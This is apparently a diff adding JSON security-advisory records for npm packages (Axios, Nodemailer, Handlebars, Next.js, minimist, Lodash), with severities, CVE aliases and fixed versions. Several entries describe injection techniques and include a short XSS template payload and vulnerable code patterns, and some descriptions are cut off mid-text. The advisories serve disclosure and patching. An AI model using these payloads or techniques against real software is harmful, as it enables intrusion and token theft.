+  ]
+ },
+ {
+  "id": "GHSA-wf5p-g6vw-rhxx",
+  "summary": "Axios Cross-Site Request Forgery Vulnerability",
+  "details": "An issue discovered in Axios 0.8.1 through 1.5.1 inadvertently reveals the confidential XSRF-TOKEN stored in cookies by including it in the HTTP header X-XSRF-TOKEN for every request made to any host allowing attackers to view sensitive information.",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2023-45857"
+  ],
+  "published": "2023-11-08T21:30:37Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-45857",
+  "fixed": [
+   "axios@1.6.0",
+   "axios@0.28.0"
+  ]
+ },
+ {
+  "id": "GHSA-wmmp-3585-3rmp",
+  "summary": "Nodemailer: IDN/Punycode domain allow-list bypass leads to email delivery to an attacker-controlled domain",
+  "details": "### Summary\n\nNodemailer resolves an international (IDN / non-ASCII) recipient **domain** to a different Punycode `xn--` label than every UTS‑46‑conformant parser (web browsers, the WHATWG URL Standard, Node's `url.domainToASCII`, Python's `idna`). Its address normalizer (`_normalizeAddress` in `lib/mime-node/index.js`) uses the bundled **raw RFC‑3492 Punycode codec with no UTS‑46 mapping/normalization**, so a domain that a standards‑compliant validator maps to a trusted domain is delivered by Nodemailer to a **different, attacker‑registrable domain**.\n\nAn application that applies a domain allow‑list / same‑domain check to a recipient using a normal IDN‑aware parser (or that shows the normalized recipient to a user for confirmation) and then relies on Nodemailer to deliver to that domain can be induced to send email to an **unintended external domain**. This is the same weakness class as CVE‑2025‑13033 (Interpretation Conflict, CWE‑436) but reached through IDN/Punycode rather than quoted local‑parts, and it is not addressed by the 7.0.7 fix.\n\nBecause the mismatch can be triggered with an **invisible** character (U+00AD SOFT HYPHEN) that UTS‑46 folds away to the *exact* trusted domai",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2026-92598"
+  ],
+  "published": "2026-09-08T21:33:32Z",
+  "url": "https://osv.dev/vulnerability/GHSA-wmmp-3585-3rmp",
+  "fixed": [
+   "nodemailer@9.1.0"
+  ]
+ },
+ {
+  "id": "GHSA-wqvq-jvpq-h66f",
+  "summary": "Nodemailer jsonTransport bypasses disableFileAccess and disableUrlAccess during message normalization",
+  "details": "### Summary\n\nNodemailer's `disableFileAccess` and `disableUrlAccess` options are intended to prevent message content and attachments from reading local files or fetching URLs. The normal MIME streaming path enforces those options in `MimeNode._getStream()`. However, `jsonTransport` serializes messages by calling `mail.normalize()`, which resolves `html`, `text`, alternatives, calendar events, and attachments through `shared.resolveContent()` before MIME generation. `shared.resolveContent()` reads local files and fetches HTTP(S) URLs directly, without receiving or checking `disableFileAccess` or `disableUrlAccess`.\n\nAs a result, applications that use `jsonTransport` as a safe serializer or queue payload generator while relying on `disableFileAccess` / `disableUrlAccess` can still be made to read local files into the generated JSON output or make outbound HTTP requests when an attacker controls message content fields such as attachment `path` or `text.href`.\n\nThe same missing-enforcement root cause is also reachable before normal streaming when `attachDataUrls` causes `_convertDataImages()` to call `mail.resolveContent(mail.data, 'html', ...)`; this should be fixed with the same acce",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2026-82660"
+  ],
+  "published": "2026-06-15T17:35:10Z",
+  "url": "https://osv.dev/vulnerability/GHSA-wqvq-jvpq-h66f",
+  "fixed": [
+   "nodemailer@8.0.9"
+  ]
+ },
+ {
+  "id": "GHSA-xhjh-pmcv-23jw",
+  "summary": "Axios: Null Byte Injection via Reverse-Encoding in AxiosURLSearchParams",
+  "details": "# Vulnerability Disclosure: Null Byte Injection via Reverse-Encoding in AxiosURLSearchParams\n\n## Summary\n\nThe `encode()` function in `lib/helpers/AxiosURLSearchParams.js` contains a character mapping (`charMap`) at line 21 that **reverses** the safe percent-encoding of null bytes. After `encodeURIComponent('\\x00')` correctly produces the safe sequence `%00`, the charMap entry `'%00': '\\x00'` converts it back to a raw null byte.\n\nThis is a clear encoding defect: every other charMap entry encodes in the safe direction (literal → percent-encoded), while this single entry decodes in the opposite (dangerous) direction.\n\n**Severity:** Low (CVSS 3.7)\n**Affected Versions:** All versions containing this charMap entry\n**Vulnerable Component:** `lib/helpers/AxiosURLSearchParams.js:21`\n\n## CWE\n\n- **CWE-626:** Null Byte Interaction Error (Poison Null Byte)\n- **CWE-116:** Improper Encoding or Escaping of Output\n\n## CVSS 3.1\n\n**Score: 3.7 (Low)**\n\nVector: `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N`\n\n| Metric | Value | Justification |\n|---|---|---|\n| Attack Vector | Network | Attacker controls input parameters remotely |\n| Attack Complexity | High | Standard axios request flow (`buildURL`) uses",
+  "severity": "LOW",
+  "aliases": [
+   "CVE-2026-42040"
+  ],
+  "published": "2026-05-05T00:18:03Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-42040",
+  "fixed": [
+   "axios@1.15.1",
+   "axios@0.31.1"
+  ]
+ },
+ {
+  "id": "GHSA-xhpv-hc6g-r9c6",
+  "summary": "Handlebars.js has JavaScript Injection via AST Type Confusion when passing an object as dynamic partial",
+  "details": "## Summary\n\nA crafted object placed in the template context can bypass all conditional guards in `resolvePartial()` and cause `invokePartial()` to return `undefined`. The Handlebars runtime then treats the unresolved partial as a source that needs to be compiled, passing the crafted object to `env.compile()`. Because the object is a valid Handlebars AST containing injected code, the generated JavaScript executes arbitrary commands on the server. The attack requires the adversary to control a value that can be returned by a dynamic partial lookup.\n\n## Description\n\nThe vulnerable code path spans two functions in `lib/handlebars/runtime.js`:\n\n**`resolvePartial()`:** A crafted object with `call: true` satisfies the first branch condition (`partial.call`) and causes an early return of the original object itself, because none of the remaining conditionals (string check, `options.partials` lookup, etc.) match a plain object. The function returns the crafted object as-is.\n\n**`invokePartial()`:** When `resolvePartial` returns a non-function object, `invokePartial` produces `undefined`. The runtime interprets `undefined` as \"partial not yet compiled\" and calls `env.compile(partial, ...)` whe",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-33940"
+  ],
+  "published": "2026-03-27T18:21:44Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-33940",
+  "fixed": [
+   "handlebars@4.7.9"
+  ]
+ },
+ {
+  "id": "GHSA-xjpj-3mr7-gcpf",
+  "summary": "Handlebars.js has JavaScript Injection in CLI Precompiler via Unescaped Names and Options",
+  "details": "## Summary\n\nThe Handlebars CLI precompiler (`bin/handlebars` / `lib/precompiler.js`) concatenates user-controlled strings — template file names and several CLI options — directly into the JavaScript it emits, without any escaping or sanitization. An attacker who can influence template filenames or CLI arguments can inject arbitrary JavaScript that executes when the generated bundle is loaded in Node.js or a browser.\n\n## Description\n\n`lib/precompiler.js` generates JavaScript source by string-interpolating several values directly into the output. Four distinct injection points exist:\n\n### 1. Template name injection\n\n```javascript\n// Vulnerable code pattern\noutput += 'templates[\"' + template.name + '\"] = template(...)';\n```\n\n`template.name` is derived from the file system path. A filename containing `\"` or `'];` breaks out of the string literal and injects arbitrary JavaScript.\n\n### 2. Namespace injection (`-n` / `--namespace`)\n\n```javascript\n// Vulnerable code pattern\noutput += 'var templates = ' + opts.namespace + ' = ' + opts.namespace + ' || {};';\n```\n\n`opts.namespace` is emitted as raw JavaScript. Anything after a `;` in the value becomes an additional JavaScript statement.\n\n### ",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-33941"
+  ],
+  "published": "2026-03-27T18:22:10Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-33941",
+  "fixed": [
+   "handlebars@4.7.9"
+  ]
+ },
+ {
+  "id": "GHSA-xv57-4mr9-wg8v",
+  "summary": "Next.js Content Injection Vulnerability for Image Optimization",
+  "details": "A vulnerability in **Next.js Image Optimization** has been fixed in **v15.4.5** and **v14.2.31**. The issue allowed attacker-controlled external image sources to trigger file downloads with arbitrary content and filenames under specific configurations. This behavior could be abused for phishing or malicious file delivery.\n\nAll users relying on `images.domains` or `images.remotePatterns` are encouraged to upgrade and verify that external image sources are strictly validated.\n\nMore details at [Vercel Changelog](https://vercel.com/changelog/cve-2025-55173)",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2025-55173"
+  ],
+  "published": "2025-08-29T21:59:55Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-55173",
+  "fixed": [
+   "next@14.2.31",
+   "next@15.4.5"
+  ]
+ },
+ {
+  "id": "GHSA-xvch-5gv4-984h",
+  "summary": "Prototype Pollution in minimist",
+  "details": "Minimist prior to 1.2.6 and 0.2.4 is vulnerable to Prototype Pollution via file `index.js`, function `setKey()` (lines 69-95).",
+  "severity": "CRITICAL",
+  "aliases": [
+   "CVE-2021-44906"
+  ],
+  "published": "2022-03-18T00:01:09Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-44906",
+  "fixed": [
+   "minimist@1.2.6",
+   "minimist@0.2.4"
+  ]
+ },
+ {
+  "id": "GHSA-xw65-4hp5-5hc7",
+  "summary": "Handlebars: JavaScript Injection via Unsafe Inline Embedding of Precompiled Templates",
+  "details": "## Summary\n\n`Handlebars.precompile()` generates JavaScript source that is commonly embedded in browser `<script>` elements. Before the fix, static template text containing `</script>` was emitted unchanged. HTML parsers recognize `</script>` even inside a JavaScript string literal, closing the surrounding script element and allowing following attacker-controlled markup to be parsed and executed.\n\nThis affects applications that precompile attacker-controlled templates and embed the generated source directly in an HTML `<script>` element. It does not affect ordinary server-side rendering or precompiled templates delivered as external JavaScript files.\n\n## Details\n\nStatic text is serialized by `quotedString()` in `lib/handlebars/compiler/code-gen.js`. The generated JavaScript is valid, but JavaScript quoting alone does not make it safe to embed in HTML. In HTML script data, the sequence `</script>` terminates the element regardless of JavaScript string context.\n\nOn affected releases, this template:\n\n```handlebars\nsafe</script><script>alert(\"XSS\")</script><script>\n```\n\ncould produce generated source containing:\n\n```js\nreturn 'safe</script><script>alert(\"XSS\")</script><script>';\n```\n\nWh",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2026-106444"
+  ],
+  "published": "2026-10-08T17:52:37Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-106444",
+  "fixed": [
+   "handlebars@4.7.10"
+  ]
+ },
+ {
+  "id": "GHSA-xx6v-rp6x-q39c",
+  "summary": "Axios: XSRF Token Cross-Origin Leakage via Prototype Pollution Gadget in `withXSRFToken` Boolean Coercion",
+  "details": "# Vulnerability Disclosure: XSRF Token Cross-Origin Leakage via Prototype Pollution Gadget in `withXSRFToken` Boolean Coercion\n\n## Summary\n\nThe Axios library's XSRF token protection logic uses JavaScript truthy/falsy semantics instead of strict boolean comparison for the `withXSRFToken` config property. When this property is set to any truthy non-boolean value (via prototype pollution or misconfiguration), the same-origin check (`isURLSameOrigin`) is **short-circuited**, causing XSRF tokens to be sent to **all** request targets including cross-origin servers controlled by an attacker.\n\n**Severity:** Medium (CVSS 5.4)\n**Affected Versions:** All versions since `withXSRFToken` was introduced\n**Vulnerable Component:** `lib/helpers/resolveConfig.js:59`\n**Environment:** Browser-only (XSRF logic only runs when `hasStandardBrowserEnv` is true)\n\n## CWE\n\n- **CWE-201:** Insertion of Sensitive Information Into Sent Data\n- **CWE-183:** Permissive List of Allowed Inputs\n\n## CVSS 3.1\n\n**Score: 5.4 (Medium)**\n\nVector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N`\n\n| Metric | Value | Justification |\n|---|---|---|\n| Attack Vector | Network | PP triggered remotely via vulnerable dependency |\n| Attac",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2026-42042"
+  ],
+  "published": "2026-05-05T00:25:22Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-42042",
+  "fixed": [
+   "axios@1.15.1",
+   "axios@0.31.1"
+  ]
+ },
+ {
+  "id": "GHSA-xxjr-mmjv-4gpg",
+  "summary": "Lodash has Prototype Pollution Vulnerability in `_.unset` and `_.omit` functions",
+  "details": "### Impact\n\nLodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes. \n\nThe issue permits deletion of properties but does not allow overwriting their original behavior.  \n\n### Patches\n\nThis issue is patched on 4.17.23.",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2025-13465"
+  ],
+  "published": "2026-01-21T23:01:22Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-13465",
+  "fixed": [
+   "lodash@4.17.23",
+   "lodash-es@4.17.23",
+   "lodash-amd@4.17.23"
+  ]
+ }
+]
